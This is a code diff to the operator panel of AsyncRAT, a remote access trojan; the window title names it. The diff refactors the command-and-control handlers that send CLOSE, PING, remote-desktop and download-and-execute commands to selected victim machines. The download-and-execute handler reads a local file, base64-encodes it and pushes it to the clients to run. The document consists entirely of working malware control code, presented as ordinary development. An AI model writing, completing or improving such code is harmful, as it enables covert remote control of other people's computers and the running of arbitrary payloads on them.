@@ -27,38 +27,25 @@ Public Class Form1
 
     End Sub
 
-    Private Async Sub CloseClientToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseClientToolStripMenuItem.Click
+    Private Sub CloseClientToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseClientToolStripMenuItem.Click
         If LV1.SelectedItems.Count > 0 Then
             Try
 
 
-                Dim M As New MemoryStream
-                Dim S As Byte() = SB("CLOSE")
-                Await M.WriteAsync(S, 0, S.Length)
-                Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)
-
+                Dim B As Byte() = SB("CLOSE")
                 For Each C As ListViewItem In LV1.SelectedItems
                     Dim x As Client = CType(C.Tag, Client)
                     Try
-                        x.C.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
-                        x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C.Tag)
+                        x.Send(B)
                     Catch ex As Exception
-                        x.isDisconnected()
                     End Try
                 Next
-
-                Try
-                    Await M.FlushAsync()
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
-
             Catch ex As Exception
             End Try
         End If
     End Sub
 
-    Private Async Sub DownloadAndExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadAndExecuteToolStripMenuItem.Click
+    Private Sub DownloadAndExecuteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadAndExecuteToolStripMenuItem.Click
         If LV1.SelectedItems.Count > 0 Then
             Try
 
@@ -69,59 +56,35 @@ Public Class Form1
                 End With
 
                 If o.ShowDialog = Windows.Forms.DialogResult.OK Then
-                    Dim M As New MemoryStream
-                    Dim S As Byte() = SB("DW" & Settings.SPL & Path.GetExtension(o.FileName) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
-                    Await M.WriteAsync(S, 0, S.Length)
-                    Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)
+                    Dim B As Byte() = SB("DW" & Settings.SPL & Path.GetExtension(o.FileName) & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes(o.FileName)))
 
                     For Each C As ListViewItem In LV1.SelectedItems
                         Dim x As Client = CType(C.Tag, Client)
 
                         Try
-                            x.C.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
-                            x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C.Tag)
+                            x.Send(B)
                         Catch ex As Exception
-                            x.isDisconnected()
                         End Try
                     Next
-
-                    Try
-                        Await M.FlushAsync()
-                        M.Dispose()
-                    Catch ex As Exception
-                    End Try
-
                 End If
             Catch ex As Exception
             End Try
         End If
     End Sub
 
-    Private Async Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
+    Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
         If LV1.SelectedItems.Count > 0 Then
             Try
 
 
-                Dim M As New MemoryStream
-                Dim S As Byte() = SB("RD-")
-                Await M.WriteAsync(S, 0, S.Length)
-                Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)
-
+                Dim B As Byte() = SB("RD-")
                 For Each C As ListViewItem In LV1.SelectedItems
                     Dim x As Client = CType(C.Tag, Client)
                     Try
-                        x.C.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
-                        x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C.Tag)
+                        x.Send(B)
                     Catch ex As Exception
-                        x.isDisconnected()
                     End Try
                 Next
-
-                Try
-                    Await M.FlushAsync()
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
 
             Catch ex As Exception
             End Try
@@ -132,7 +95,7 @@ Public Class Form1
         Try
 
             ToolStripStatusLabel1.Text = String.Format("Total Clients [{0}]       Selected Clients [{1}]", LV1.Items.Count.ToString, LV1.SelectedItems.Count.ToString)
-            Me.Text = "AsyncRAT  // NYAN CAT  // " + DateTime.Now
+            Text = "AsyncRAT  // NYAN CAT  // " + DateTime.Now
 
         Catch ex As Exception
         End Try
@@ -142,26 +105,14 @@ Public Class Form1
         If LV1.Items.Count > 0 Then
             Try
 
-                Dim M As New MemoryStream
-                Dim S As Byte() = SB("PING!")
-                Await M.WriteAsync(S, 0, S.Length)
-                Await M.WriteAsync(SB(Settings.EOF), 0, Settings.EOF.Length)
-
+                Dim B As Byte() = SB("PING!")
                 For Each C As ListViewItem In LV1.SelectedItems
                     Dim x As Client = CType(C.Tag, Client)
                     Try
-                        x.C.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
-                        x.C.BeginSend(M.ToArray, 0, M.Length, Net.Sockets.SocketFlags.None, New AsyncCallback(AddressOf x.EndSend), C.Tag)
+                        x.Send(B)
                     Catch ex As Exception
-                        x.isDisconnected()
                     End Try
                 Next
-
-                Try
-                    Await M.FlushAsync()
-                    M.Dispose()
-                Catch ex As Exception
-                End Try
 
             Catch ex As Exception
             End Try
